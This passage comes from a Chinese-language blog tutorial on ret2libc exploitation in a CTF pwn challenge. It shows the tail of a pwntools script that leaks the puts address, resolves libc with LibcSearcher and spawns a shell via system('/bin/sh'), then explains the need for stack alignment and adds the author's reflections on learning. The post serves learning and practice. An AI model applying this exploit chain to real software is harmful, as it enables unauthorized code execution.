0x0000000000400506\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x0000000000400743\npayload_first = offset * b'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)\np.sendlineafter(\"overflow?\\n\",payload_first)\np.recvuntil(\"I hope you win\\n\")\nreal_puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))\nlibc = LibcSearcher(\"puts\", real_puts_addr)\nlibc_base = real_puts_addr - libc.dump(\"puts\")\nsystem_addr = libc_base + libc.dump(\"system\")\nbinsh_addr = libc_base + libc.dump(\"str_bin_sh\")\npayload_end = offset * b'a' + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\np.sendlineafter(\"overflow?\\n\",payload_end)\np.interactive()\n```\n运行脚本即可，但记住即使是LibcSearcher，也要选对对应的libc.so版本，否则即使你脚本代码是对的，也没有办法打通\n\n\n![image](https://s2.loli.net/2024/12/03/GMHoRVehnTQuPiE.png)\n\n至于为什么要进行ret空转，是因为**ubuntu18及以上**在**调用system函数的时候会先进行一个检测**，如果此时的**栈没有16字节对齐的话**，就会**强行把程序crash掉**，所以需要**栈对齐**\n———————————————————————————————————————————————————————————————————————————————————————————————\n感慨：ret2libc对刚开始接触pwn的人来说，确实是很难的，因为新出来的知识点多了很多，并且也有些难度，博主自己都学习了快一周才明白到底是个什么流程，该如何进行攻击。这个真的，得自觉去学习，去搜索资料，去看相关视频。光博主自己在网络上找的都焦头烂额，感觉好多人其实讲的有些晦涩，或简略，让人很难理解，所以我萌生了自己写一篇关于libc泄露的讲解，以我自己理解的方式，尽可能的通俗生动地去讲解。可能有一些地方不太准确，欢迎大家来指正，我会在后续进行修正的","tags":["Stack","Pwn"],"categories":["网络安全"]}]